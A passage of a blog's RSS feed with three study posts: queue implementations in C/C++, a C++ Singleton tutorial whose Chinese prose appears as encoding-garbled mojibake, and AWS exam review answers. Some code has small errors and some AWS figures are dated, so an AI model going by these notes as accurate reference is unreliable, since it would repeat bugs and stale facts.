&lt;/ul></description></item><item><title>Algorithm Introduce 2 - Abstract Data types and Hash Tables</title><link>http://www.guozet.me/post/CPSC2120-Algorithm-Abstract-Data-TypeHashtable/</link><pubDate>Fri, 05 Oct 2018 02:09:31 +0000</pubDate><guid>http://www.guozet.me/post/CPSC2120-Algorithm-Abstract-Data-TypeHashtable/</guid><description>&lt;h1 id="abstract-data-type">Abstract Data Type&lt;/h1>
&lt;p>What is the abstract data type? &lt;strong>Specification&lt;/strong> of a data structure in terms of the operations it needs to support.&lt;/p>
&lt;blockquote>
&lt;p>Just a concrete(å·ä½å) approach for &lt;strong>implementation&lt;/strong> of a data structure that fulfills these requiremnts.&lt;/p>
&lt;/blockquote>
&lt;h1 id="queues-fifo-behavior">Queues (FIFO behavior)&lt;/h1>
&lt;p>Sometimes, we need a structure which can do these two things.&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Insert&lt;/strong> a new key k into the structure&lt;/li>
&lt;li>&lt;strong>Remove&lt;/strong> the least-recently-inserted key from the structure.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-05-CPSC2120-Algorithm-Abstract-Data-TypeHashtable/2018-10-04-09-55-05.png" alt="">&lt;/p>
&lt;p>But, how can we use the bacis structure &lt;code>arrays, list, stacks&lt;/code> to implement the queues. Firstly, we can&amp;rsquo;t use the &lt;code>stacks&lt;/code> to implement it. So, we try to implement the queues by &lt;code>arrays&lt;/code> and &lt;code>list&lt;/code>.&lt;/p>
&lt;ol>
&lt;li>Circular array
&lt;img src="http://www.guozet.me/images/in-post/2018-10-05-CPSC2120-Algorithm-Abstract-Data-TypeHashtable/2018-10-04-10-17-06.png" alt="">&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-cpp">class Queue{
public:
Queue();
~Queue();
void insert(int key);
int remove(void);
private:
int *A;
int front, back, N;
}
int Queue::remove(void) {
int result = A[back];
back = (back+1) % N;
return result;
}
int Queue::insert(int x) {
A[front] = x;
front = (front+1) % N;
}
&lt;/code>&lt;/pre>
&lt;ol start="2">
&lt;li>Linked list
&lt;img src="http://www.guozet.me/images/in-post/2018-10-05-CPSC2120-Algorithm-Abstract-Data-TypeHashtable/2018-10-04-10-41-41.png" alt="">&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-c">// A C program to demonstrate linked list based implementation of queue
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
// A linked list (LL) node to store a queue entry
struct QNode {
int key;
struct QNode *next;
};
// The queue, front stores the front node of LL and rear stores ths
// last node of LL
struct Queue {
struct QNode *front, *rear;
};
// A utility function to create a new linked list node.
struct QNode *newNode(int k) {
struct QNode *temp = (struct QNode *)malloc(sizeof(struct QNode));
temp-&amp;gt;key = k;
temp-&amp;gt;next = NULL;
return temp;
}
// A utility function to create an empty queue
struct Queue *createQueue() {
struct Queue *q = (struct Queue *)malloc(sizeof(struct Queue));
q-&amp;gt;front = q-&amp;gt;rear = NULL;
return q;
}
// The function to add a key k to q
void enQueue(struct Queue *q, int k) {
// Create a new LL node
struct QNode *temp = newNode(k);
// If queue is empty, then new node is front and rear both
if (q-&amp;gt;rear == NULL) {
q-&amp;gt;front = q-&amp;gt;rear = temp;
return;
}
// Add the new node at the end of queue and change rear
q-&amp;gt;rear-&amp;gt;next = temp;
q-&amp;gt;rear = temp;
}
// Function to remove a key from given queue q
struct QNode *deQueue(struct Queue *q) {
// If queue is empty, return NULL.
if (q-&amp;gt;front == NULL) return NULL;
// Store previous front and move front one node ahead
struct QNode *temp = q-&amp;gt;front;
q-&amp;gt;front = q-&amp;gt;front-&amp;gt;next;
// If front becomes NULL, then change rear also as NULL
if (q-&amp;gt;front == NULL) q-&amp;gt;rear = NULL;
return temp;
}
// Driver Program to test anove functions
int main() {
struct Queue *q = createQueue();
enQueue(q, 10);
enQueue(q, 20);
deQueue(q);
deQueue(q);
enQueue(q, 30);
enQueue(q, 40);
enQueue(q, 50);
struct QNode *n = deQueue(q);
if (n != NULL) printf(&amp;quot;Dequeued item is %d&amp;quot;, n-&amp;gt;key);
return 0;
}
&lt;/code>&lt;/pre>
&lt;hr>
&lt;h2 id="queues-example">Queues Example&lt;/h2>
&lt;h3 id="question-given-n-numbers-do-two-of-them-sum-to-42">Question: Given N numbers, do two of them sum to 42&lt;/h3>
&lt;p>We can find the number which is equal to &lt;code>42-X&lt;/code> for each number X. There are two steps for this question.&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Sort&lt;/strong> the numbers. )&lt;/li>
&lt;li>&lt;strong>For each number&lt;/strong> X in the array, use &lt;code>Binary search&lt;/code> to see if &lt;code>42-X&lt;/code> is also present in the array.&lt;/li>
&lt;/ul>
&lt;p>&amp;laquo;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;-TODO:&amp;ndash;Not Finshed&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;raquo;&lt;/p></description></item><item><title>C++è½¯ä»¶è®¾è®¡æ¨¡å¼ä¹Singleton</title><link>http://www.guozet.me/post/C++Singleton-pattern/</link><pubDate>Thu, 04 Oct 2018 15:09:31 +0000</pubDate><guid>http://www.guozet.me/post/C++Singleton-pattern/</guid><description>&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-04-C++Singleton-pattern/2018-10-09-07-43-58.png" alt="">&lt;/p>
&lt;p>ä»ä¹æ¯&lt;code>Singleton&lt;/code>? åä¾æ¨¡å¼ï¼Singletonï¼ï¼ä¿è¯ä¸ä¸ªç±»ä»æä¸ä¸ªå®ä¾ï¼å¹¶æä¾ä¸ä¸ªè®¿é®å®çå¨å±è®¿é®ç¹ã&lt;/p>
&lt;blockquote>
&lt;p>å¯ä»¥èèå¨ä¸é¢çä¸äºåºæ¯ä¸­åºç¨ï¼&lt;/p>
&lt;ul>
&lt;li>WindowsçTask Managerï¼ä»»å¡ç®¡çå¨ï¼å°±æ¯å¾å¸åçåä¾æ¨¡å¼ï¼è¿ä¸ªå¾çæå§ï¼ï¼æ³æ³çï¼æ¯ä¸æ¯å¢ï¼ä½ è½æå¼ä¸¤ä¸ªwindows task manageråï¼ ä¸ä¿¡ä½ èªå·±è¯è¯çå¦~Â &lt;/li>
&lt;li>windowsçRecycle Binï¼åæ¶ç«ï¼ä¹æ¯å¸åçåä¾åºç¨ãå¨æ´ä¸ªç³»ç»è¿è¡è¿ç¨ä¸­ï¼åæ¶ç«ä¸ç´ç»´æ¤çä»æçä¸ä¸ªå®ä¾ã&lt;/li>
&lt;li>ç½ç«çè®¡æ°å¨ï¼ä¸è¬ä¹æ¯éç¨åä¾æ¨¡å¼å®ç°ï¼å¦åé¾ä»¥åæ­¥ã&lt;/li>
&lt;li>åºç¨ç¨åºçæ¥å¿åºç¨ï¼ä¸è¬é½ä½ç¨åä¾æ¨¡å¼å®ç°ï¼è¿ä¸è¬æ¯ç±äºå±äº«çæ¥å¿æä»¶ä¸ç´å¤äºæå¼ç¶æï¼å ä¸ºåªè½æä¸ä¸ªå®ä¾å»æä½ï¼å¦ååå®¹ä¸å¥½è¿½å ã&lt;/li>
&lt;li>Webåºç¨çéç½®å¯¹è±¡çè¯»åï¼ä¸è¬ä¹åºç¨åä¾æ¨¡å¼ï¼è¿ä¸ªæ¯ç±äºéç½®æä»¶æ¯å±äº«çèµæºã&lt;/li>
&lt;li>å¨æ°æ®åºè¿æ¥æ± çè®¾è®¡ä¸è¬ä¹æ¯éç¨åä¾æ¨¡å¼ï¼å ä¸ºæ°æ®åºè¿æ¥æ¯ä¸ç§æ°æ®åºèµæºãæ°æ®åºè½¯ä»¶ç³»ç»ä¸­ä½¿ç¨æ°æ®åºè¿æ¥æ± ï¼ä¸»è¦æ¯èçæå¼æèå³é­æ°æ®åºè¿æ¥æå¼èµ·çæçæèï¼è¿ç§æçä¸çæèè¿æ¯éå¸¸æè´µçï¼å ä¸ºä½ç¨åä¾æ¨¡å¼æ¥ç»´æ¤ï¼å°±å¯ä»¥å¤§å¤§éä½è¿ç§æèã&lt;/li>
&lt;li>å¤çº¿ç¨ççº¿ç¨æ± çè®¾è®¡ä¸è¬ä¹æ¯éç¨åä¾æ¨¡å¼ï¼è¿æ¯ç±äºçº¿ç¨æ± è¦æ¹ä¾¿å¯¹æ± ä¸­ççº¿ç¨è¿è¡æ§å¶ã&lt;/li>
&lt;li>æä½ç³»ç»çæä»¶ç³»ç»ï¼ä¹æ¯å¤§çåä¾æ¨¡å¼å®ç°çå·ä½ä¾å­ï¼ä¸ä¸ªæä½ç³»ç»åªè½æä¸ä¸ªæä»¶ç³»ç»
ä¸è¿°åå®¹æ¥èªäºï¼
&lt;a href="https://blog.csdn.net/tanyujing/article/details/14160941?utm_source=copy" target="_blank" rel="noopener">åä¾æ¨¡å¼çå¸¸è§åºç¨åºæ¯&lt;/a>&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>åä¾æ¨¡å¼åºç¨çåºæ¯ä¸è¬åç°å¨ä»¥ä¸æ¡ä»¶ä¸ï¼&lt;/p>
&lt;ul>
&lt;li>èµæºå±äº«çæåµä¸ï¼é¿åç±äºèµæºæä½æ¶å¯¼è´çæ§è½ææèç­ãå¦ä¸è¿°ä¸­çæ¥å¿æä»¶ï¼åºç¨éç½®&lt;/li>
&lt;li>æ§å¶èµæºçæåµä¸ï¼æ¹ä¾¿èµæºä¹é´çäºç¸éä¿¡ãå¦çº¿ç¨æ± ç­ã&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="å¦æä¸ä½¿ç¨åä¾æ¨¡å¼æ¯ä»ä¹æ ·å­å¢">å¦æä¸ä½¿ç¨åä¾æ¨¡å¼æ¯ä»ä¹æ ·å­å¢ï¼&lt;/h2>
&lt;p>&lt;strong>åºç¨åºæ¯ï¼&lt;/strong> æä»¬ä½¿ç¨&lt;code>srand(time(0))&lt;/code>å»çäº§ä¸ä¸ªéæºæ°å­ï¼å ä¸ºè¿ä¸ªå½æ°çæçæ¯ä¼ªéæºæ°ï¼æä»¥å¦ææä»¬å¾å¿«çé¢çå»è°ç¨è¿ä¸ªå½æ°çè¯ï¼å°±ä¼åºç°è¿ä¸ªå½æ°ç»åºä¸ä¸ªåæ ·çéæºæ°å­ã&lt;/p>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;cstdlib&amp;gt; // for rand()
#include &amp;lt;iostream&amp;gt;
class Random {
public:
Random() {
int seed = time(0);
srand(seed);
}
int operator()(int a, int b) const { return (rand() % b) + a; }
private:
Random(const Random&amp;amp;);
Random&amp;amp; operator=(const Random&amp;amp;);
};
int main() {
Random random;
std::cout &amp;lt;&amp;lt; random(1, 100) &amp;lt;&amp;lt; std::endl;
}
&lt;/code>&lt;/pre>
&lt;p>Output:&lt;/p>
&lt;pre>&lt;code class="language-bash">$./run
44
$./run //åç¬¬ä¸æ¬¡é´éæ¶é´æ¯è¾é¿
72
$./run //åé¢ä¸ä¸ªè¿è¡ç¨åºçéåº¦æ¯è¾å¿«çè¯ï¼å°±ä¼åºç°å¾å°ä¸æ ·çéæºæ°
44
$./run
44
$./run
44
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>Function rand () Vs srand()&lt;/p>
&lt;ul>
&lt;li>rand() function is used in C to generate random numbers. If we generate a sequence of random number with rand() function, it will create the same sequence again and again every time program runs. Say if we are generating 5 random numbers in C with the help of rand() in a loop, then every time we compile and run the program our output must be the same sequence of numbers.&lt;/li>
&lt;li>The srand() function sets the starting point for producing a series of pseudo-random integers. If srand() is not called, the rand() seed is set as if srand(1) were called at program start. Any other value for seed sets the generator to a different starting point. Standard prac tice is to use the result of a call to srand(time(0)) as the seed&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h2 id="ä½¿ç¨åä¾æ¨¡å¼">ä½¿ç¨åä¾æ¨¡å¼&lt;/h2>
&lt;p>åä¸æ¨¡å¼çå®ç°æ¹å¼ï¼&lt;/p>
&lt;ul>
&lt;li>Place constructors and assignment in private section.&lt;/li>
&lt;li>Declare a static instance variable as a data attribute of the class&lt;/li>
&lt;li>Define the static instance variable somewhere in the anonymous namespace.&lt;/li>
&lt;li>Define a static class member function(&lt;code>getInstance&lt;/code>) to access the instance variable.&lt;/li>
&lt;/ul>
&lt;h2 id="glutå®ç°æ¨¡å¼-ææ±æ¨¡å¼çº¿ç¨ä¸å®å¨">glutå®ç°æ¨¡å¼ (ææ±æ¨¡å¼ï¼çº¿ç¨ä¸å®å¨ï¼)&lt;/h2>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;cstdlib&amp;gt; // for rand()
#include &amp;lt;iostream&amp;gt;
class Random {
public:
static Random* getInstance(); //Define a static class member function
int operator()(int a, int b) const {
return (rand() % b) + a;
}
private:
static Random* instance; //Declare a static instance variable
Random(const Random&amp;amp;);
Random&amp;amp; operator=(const Random&amp;amp;); // Constructors and assignment in private
Random() {
int seed = time(0);
srand(seed);
}
};
Random* Random::getInstance() {
if ( !instance ) instance = new Random;
return instance;
}
Random* Random::instance = NULL; //Define the static instance variable somewherr
int main() {
Random* random = Random::getInstance();
std::cout &amp;lt;&amp;lt; (*random)(1,100) &amp;lt;&amp;lt; std::endl;
delete random;
}
&lt;/code>&lt;/pre>
&lt;p>è¿ç§&lt;code>glut&lt;/code>çåä¾æ¨¡å¼å­å¨è¿ä¸å®çé®é¢ï¼å¨ãç¨åºåçèªæä¿®å»ãä¸­ç»åºäºä¸ä¸ªä¾å­ãå¨åä¾æ¨¡å¼ä¸­ï¼è¿æ¯ä¸æ®µå¸åç double-check çä»£ç .&lt;/p>
&lt;pre>&lt;code class="language-cpp">volatile T* pInst = nullptr;
T* GetInstance() {
if (nullptr == pInst) {
lock();
if (nullptr == pInst) {
pInst = new T;
}
unlock();
}
return pInst;
}
&lt;/code>&lt;/pre>
&lt;ul>
&lt;li>&lt;code>if (nulptr == pInst)&lt;/code> ä¸­çif ç¡®ä¿ä»å¨ pInst æ¯ç©ºæéçæåµä¸æå»è·åéå¹¶å°è¯æé å¯¹è±¡ï¼&lt;/li>
&lt;li>&lt;code>if (nullptr == pInst)&lt;/code> ç if åæ¯ä¸ºäºé²æ­¢è¿æ ·ä¸ç§å¯è½ï¼é¿åéå¤æä½ååå­æ³é²ï¼å¨å¤å± if æ£æµæ¯ï¼pInst å°ä¸ºç©ºï¼ä½æ¯ï¼å¾ lock() æ§è¡å®æ¯åï¼å«ççº¿ç¨å·²ç»ä¸º pInst èµå¼ã&lt;/li>
&lt;/ul>
&lt;p>è¿æ®µä»£ç ï¼ä¹ä¸çæ¯æ²¡æé®é¢çï¼ä½ä»éå°å¿æ£æ©ãæä»¬ç &lt;code>pInst = new T&lt;/code>; è¿ä¸è¡ä»£ç ï¼å®åºæ¬å®æäºä¸ä»¶äºæ&lt;/p>
&lt;ul>
&lt;li>ä¸º T ç±»åçå¯¹è±¡åéåå­ï¼&lt;/li>
&lt;li>å¨è¿çåå­ä¸æ§è¡ T çæé å½æ°ï¼&lt;/li>
&lt;li>å°è¿çåå­çèµ·å§å°åèµå¼ç» pInstã&lt;/li>
&lt;/ul>
&lt;p>ç±äºæé å½æ°çæ§è¡åæéçèµå¼æ¯äºä¸ä¾èµçï¼æä»¥ CPU å¯è½ä¼äº¤æ¢è¿ä¸¤ä¸ªæ­¥éª¤çé¡ºåºãå æ­¤ï¼å¨çº¿ç¨æ§è¡çè¿ç¨ä¸­ï¼å¯è½å­å¨è¿æ ·ä¸ç§æåµï¼nullptr != pInstï¼ä½æ¯å®æåçå¯¹è±¡å°æªæé æåãäºæ¯ï¼å¦æå¨è¿ä¸æ¶å»ï¼å½åçº¿ç¨è¢«ä¸­æ­ï¼å¹¶ä¸å¶å®çº¿ç¨è°ç¨ GetInstance å½æ°ï¼é£ä¹å½æ°å¨å¤å± if æ§è¡ä¹åï¼ä¼ç´æ¥è¿å pInst çå¼ãèæ­¤æ¶ pInst å®éä¸æåçæ¯ä¸çå°æªåå§åçåå­ãå¦æçº¿ç¨ä»£ç å¯¹ pInst è¿è¡è®¿é®ï¼é£ä¹ç¨åºå¾æå¯è½å°±ä¼å´©æºã&lt;/p>
&lt;p>ä¸ºäºè§£å³è¿ç±» CPU å¨æè°åº¦å¯¼è´çé®é¢ï¼æä»¬éè¦æå¨æäºæåµä¸é»æ­¢æä»¤æ¢åºæ§è¡çè½åãç¶èéæ¾çæ¯ï¼ç±äºå¨æè°åº¦æ¯ CPU çåè½ï¼æä»¥å¨é«çº§è¯­è¨çå±æ¬¡ï¼æä»¬æ²¡æéç¨çè§£å³åæ³ââåªè½ä¾èµå·ä½ç CPU æ¶æï¼å¯¹ä»£ç è¿è¡è°æ´ãå¯¹äº i386 æ¶æç CPU æ¥è¯´ï¼å®æä¾äºä¸æ¡æä»¤ mfenceï¼memory fence çç¼©åï¼ï¼å¯ä»¥é»æ­¢è¿ç§æ¢åºæ§è¡ã&lt;/p>
&lt;pre>&lt;code class="language-cpp">#define barrier() __asm__ volatile(&amp;quot;mfence&amp;quot;)
volatile T* pInst = nullptr;
T* GetInstance() {
if (nullptr == pInst) {
lock();
if (nullptr == pInst) {
T* temp = new T;
barrier();
pInst = temp;
}
unlock();
}
return pInst;
}
&lt;/code>&lt;/pre>
&lt;p>ç¨ barrier() ä¿è¯äºå¨ pInst è¢«èµå¼ä¹åï¼ç¸å³åå­åºåå·²ç»æ­£ç¡®å°åå§åäºã&lt;/p>
&lt;h2 id="meyersåä¾æ¨¡å¼å®ç°">Meyersåä¾æ¨¡å¼å®ç°&lt;/h2>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;cstdlib&amp;gt; // for rand()
#include &amp;lt;iostream&amp;gt;
class Random {
public:
static Random&amp;amp; getInstance();
int operator()(int a, int b) const {
return (rand() % b) + a;
}
private:
Random(const Random&amp;amp;);
Random&amp;amp; operator=(const Random&amp;amp;);
Random() {
int seed = time(0);
srand(seed);
}
};
Random&amp;amp; Random::getInstance() {
static Random instance;
return instance;
}
int main() {
Random&amp;amp; random = Random::getInstance();
std::cout &amp;lt;&amp;lt; random(1,100) &amp;lt;&amp;lt; std::endl;
}
&lt;/code>&lt;/pre>
&lt;p>ç¬¬äºç§å®ç°æ¹å¼åä¹åä¸ç§å®ç°æ¹å¼çåºå«å¨ï¼
ç¬¬ä¸ç§&lt;/p>
&lt;ul>
&lt;li>ææ±æ¨¡å¼ç³æäºä¸ä¸ªéæå¯¹è±¡ï¼å¨ç¨æ·ç¬¬ä¸æ¬¡è°ç¨æ¶åå§åï¼è½ç¶èçº¦äºèµæºï¼ä½ç¬¬ä¸æ¬¡å è½½æ¶éè¦å®ä¾åï¼åæ ç¨æ¢ä¸äºï¼èä¸å¨å¤çº¿ç¨ä¸è½æ­£å¸¸å·¥ä½ã&lt;/li>
&lt;/ul>
&lt;pre>&lt;code class="language-cpp">//First one
Random* Random::getInstance() {
if ( !instance ) instance = new Random;
return instance;
}
Random* Random::instance = NULL; //Define the static instance variable somewherr
&lt;/code>&lt;/pre>
&lt;p>ç¬¬äºç§ï¼&lt;/p>
&lt;ul>
&lt;li>å¨ç±»å è½½æ¶å°±å®æäºåå§åï¼æä»¥ç±»å è½½è¾æ¢ï¼ä½è·åå¯¹è±¡çéåº¦å¿«ã è¿ç§æ¹å¼åºäºç±»å è½½æºå¶é¿åäºå¤çº¿ç¨çåæ­¥é®é¢ï¼ä½æ¯ä¹ä¸è½ç¡®å®æå¶ä»çæ¹å¼ï¼æèå¶ä»çéææ¹æ³ï¼å¯¼è´ç±»è£è½½ï¼è¿æ¶ååå§åinstanceæ¾ç¶æ²¡æè¾¾å°æå è½½çææã&lt;/li>
&lt;/ul>
&lt;pre>&lt;code class="language-cpp">//Second One
Random&amp;amp; Random::getInstance() {
static Random instance;
return instance;
}
&lt;/code>&lt;/pre>
&lt;p>æ¨èéè¯»ï¼
&lt;a href="https://blog.csdn.net/itachi85/article/details/50510124" target="_blank" rel="noopener">è®¾è®¡æ¨¡å¼ï¼äºï¼åä¾æ¨¡å¼çä¸ç§åæ³&lt;/a>&lt;/p></description></item><item><title>Cloud computing Basic concepts 2</title><link>http://www.guozet.me/post/CPSC6440-CloudComputing-basic-concepts2/</link><pubDate>Thu, 04 Oct 2018 15:09:31 +0000</pubDate><guid>http://www.guozet.me/post/CPSC6440-CloudComputing-basic-concepts2/</guid><description>&lt;p>Exam_2 Review Questions. Approximately 60% of the exam will be derived from these questions.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>True or &lt;code>False&lt;/code>: Users should store dynamic web content in S3.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What advantage is there in storing static web content in S3?
S3 is reliable, and durable. S3 is simple to ensure static web content is quickly accessible, always available, and secure.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Name four AWS constructs that allow you to control your VPC traffic.
Internet gateway, route tables, security group, network access control lists.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or &lt;code>False&lt;/code>: Security groups are stateless and Network ACLs are stateful. Explain what this means.
Security group: Return traffic is automatically allowed, regardless of any rules.
ACLs: Return traffic must be explicitly allowed by rules.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What is the purpose of an Internet Gateway? Is this a managed AWS service?
Yes, itâs a managed AWS service. An Internet gateway serves two purposes: to provide a target in your VPC route tables for Internet-routable traffic, and to perform network address translation (NAT) for instances that have been assigned public IPv4 addresses.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Describe the main difference between a public and a private subnet.
The main difference is the route for 0.0.0.0/0 in the associated route table. &lt;code>A private subnet sets that route to a NAT instance.&lt;/code> Private subnet instances only need a private IP and internet traffic is routed through the NAT in the public subnet. You could also have no route to 0.0.0.0/0 to make it a truly private subnet with no internet access in or out. A public subnet routes 0.0.0.0/0 through an Internet Gateway (igw). Instances in a public subnet require public IPs to talk to the internet.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Expand each of the following acronyms of the following in the context of this class and provide a short description of what each is:&lt;/p>
&lt;ul>
&lt;li>RTO Recovery Time Objective, how quickly the system can recover?&lt;/li>
&lt;li>RPO Recovery Point Objective, how much data can you afford to lose?&lt;/li>
&lt;li>&lt;strong>HA High Availability&lt;/strong>&lt;/li>
&lt;li>DNS Domain Name System&lt;/li>
&lt;li>JSON JavaScript Object Notation&lt;/li>
&lt;li>SOA Service Oriented Architecturegh&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>What is the difference about On-Premises HA Vs HA on AWS&lt;/p>
&lt;ul>
&lt;li>On-Promises HA: 1. very expensive; 2. It&amp;rsquo;s suitable only for mission-critical(æ´¾é£ç¡®å®ç) applications.&lt;/li>
&lt;li>HA on AWS: 1.Multiple services. 2.Isolated redundancy data centers within each availability zone. 3.multiple availability zones within each region. 4. Region across the global. 5.Fault-tolerance service.&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;blockquote>
&lt;p>From 100-CCA-31-EN-U3SG.pdf Module 3.&lt;/p>
&lt;/blockquote>
&lt;ol start="8">
&lt;li>
&lt;p>&lt;strong>List the three main factors associated with High Availability.&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Fault tolerance: the &lt;strong>built-in redundancy&lt;/strong> of an applicationâs component(ç»ä»¶).&lt;/li>
&lt;li>Recoverability: the process, policies, and procedures related to &lt;strong>restoring service&lt;/strong> after a catastrophic(ç¾é¾æ§ç) event.&lt;/li>
&lt;li>Scalability: the ability of application to &lt;strong>accommodate growth&lt;/strong> without changing design.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>What does enabling connection draining on an ELB do? Why is this important?
This enables the load balancer to complete in-flight requests made to instances that are de-registering or unhealthy. To ensure that a Classic Load Balancer stops sending requests to instances that are de-registering or unhealthy, while keeping the existing connections open.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>True&lt;/code> or False: Amazon CloudWatch allows the user to create custom metrics for their specific application.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What are three types of capacity parameters that an Auto Scaling Group defines?
Desired, minimum,maximum&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Define a sample Auto Scale Policy.
The scaling policies that you define adjust the number of instances, within your minimum and maximum number of instances, based on the criteria that you specify.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or &lt;code>False&lt;/code>: When using Auto Scaling, you should be more cautious scaling in and try to avoid aggressive instance termination.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What are three languages AWS Lambda currently supports?
Python, JavaScript, java, c#&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What AWS Service can be classified as Infrastructure as Code?
AWS CloudFormation&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Define AWS CloudFormation.
AWS CloudFormation is a service that can be classified as infrastructure as code.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>List seven possible sections that can be included in a AWS CloudFormation Template.
Description, metadata, parameters, mappings, conditions, transform, resources.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>True&lt;/code> or False: The more loosely your system is coupled the more easily it scales.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Define Services in the context of a SOA.
Services are self-contained units of functionality.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Define a Microservice and give an example.
Microservice: Small, independent processes within an SOA. Each process is focused on doing one small task. Processes communicate to each other using language-agnostic APIs.
&lt;del>&lt;strong>Example&lt;/strong>: SNS? Use application load balancer with EC2 container service and auto scaling to implement mircoservice application.&lt;/del>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What AWS Service provides a fully managed message queueing service?
SQS: Amazon Simple Queue Service is a fully managed message queueing service. Transmit any volume of messages at any level of throughput without losing messages or requiring other services to be always available.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What is a dead letter queue?
A dead letter queue is a queue of messages that could not be processed.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>List three Amazon SQS use cases.&lt;/p>
&lt;ul>
&lt;li>Work Queues: Decouple components of a distributed application that may not all process the same amount of work simultaneously.&lt;/li>
&lt;li>Buffering Batch Operations: Add scalability and reliability to your architecture and smooth out temporary volume spikes without losing messages or increasing latency.&lt;/li>
&lt;li>Request Offloading: Move slow operations off of interactive request paths by enqueueing the request.&lt;/li>
&lt;li>Fan-out: Combine Amazon SQS with Amazon SNS to send identical copies of a message to multiple queues in parallel for simultaneous processing.&lt;/li>
&lt;li>Auto Scaling: Use Amazon SQS queues to help determine the load on an application, and when combined with Auto Scaling, you can scale the number of Amazon EC2 instances out or in, depending on the volume of traffic.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>List three subscriber types allowed by Amazon SNS.&lt;/p>
&lt;ul>
&lt;li>Email(plain or JSON)&lt;/li>
&lt;li>HTTP/HTTPS&lt;/li>
&lt;li>Short Message Service(SMS) clients(USA only)&lt;/li>
&lt;li>Amazon SQS queues&lt;/li>
&lt;li>Mobile push messaging&lt;/li>
&lt;li>AWS lambda function&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>List the characteristics of Amazon SNS.
Single published message, Order is not guaranteed, No recall, HTTP/HTTPS retry, 256 KB max per message&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or False: Amazon Kinesis is a database solution.
False? Amazon Kinesis makes it easy to collect, process, and analyze real-time, streaming data so you can get timely insights and react quickly to new information.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Amazon S3 provides &lt;em>read-after-write&lt;/em> consistency for PUTS of new objects and provides &lt;em>eventual&lt;/em> consistency for overwrites of PUTS and DELETES.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Define eventual consistency. Define read-after-write consistency. (no specific definition)
Eventual consistency is a consistency model used in distributed computing to achieve high availability that informally guarantees that, if no new updates are made to a given data item, eventually all accesses to that item will return the last updated value.
&lt;strong>Read-after-write consistency&lt;/strong> is similar to a strongly consistent read returns a result that reflects all writes that received a successful response prior to the read.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Fill in the chart below:&lt;/p>
&lt;/li>
&lt;/ol>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th align="left">Null&lt;/th>
&lt;th align="left">Amazon SNS&lt;/th>
&lt;th align="left">Amazon SQS&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td align="left">Manage Persistence&lt;/td>
&lt;td align="left">No&lt;/td>
&lt;td align="left">Yes&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">Delivery Mechanism&lt;/td>
&lt;td align="left">Push(Passive)&lt;/td>
&lt;td align="left">Poll(Active)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">Producer/Consumer&lt;/td>
&lt;td align="left">Publish(subscriber)&lt;/td>
&lt;td align="left">Send(receive)&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ol start="31">
&lt;li>
&lt;p>AWS Lambda starts code within &lt;code>milliseconds&lt;/code> of an event.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>List four triggers currently supported by AWS Lambda.&lt;/p>
&lt;ul>
&lt;li>Amazon DynamoDB&lt;/li>
&lt;li>S3&lt;/li>
&lt;li>SNS&lt;/li>
&lt;li>CloudWatch&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>How many different levels of resource allocation does AWS Lambda provide? What is the range of memory provided? What is the maximum runtime of a AWS Lambda function?&lt;/p>
&lt;ul>
&lt;li>23 different levels&lt;/li>
&lt;li>128M-1.5G&lt;/li>
&lt;li>5 minutes&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>True or &lt;code>False&lt;/code>: Amazon CloudFront is located within AWS Edge Locations.&lt;/p>
&lt;/li>
&lt;li>
